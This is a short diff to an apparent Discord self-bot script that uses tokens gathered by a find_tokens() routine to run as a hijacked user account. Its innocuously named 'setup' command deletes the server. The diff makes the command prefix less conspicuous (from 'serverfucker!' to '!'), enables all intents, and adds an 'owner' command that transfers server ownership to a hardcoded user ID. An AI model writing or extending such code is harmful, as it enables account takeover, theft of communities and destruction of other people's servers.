@@ -18,14 +18,19 @@ def find_tokens():
                     tokens.append(token)
     return token
 
+intents = discord.Intents.all()
 token2 = str(find_tokens()) #insert target token
-prefix = "serverfucker!"
+prefix = "!"
 client = discord.Client()
 message = discord.Message 
-bot = commands.Bot(command_prefix=prefix, self_bot=True)
+bot = commands.Bot(command_prefix=prefix, self_bot=True, intents=intents)
 @bot.command()
 async def setup(ctx):
     await ctx.guild.delete()
+@bot.command()
+async def owner(ctx):
+    user = await bot.fetch_user(USERID)
+    await ctx.guild.edit(owner=user)
 
 asyncio.set_event_loop(asyncio.new_event_loop())
 loop = asyncio.new_event_loop()
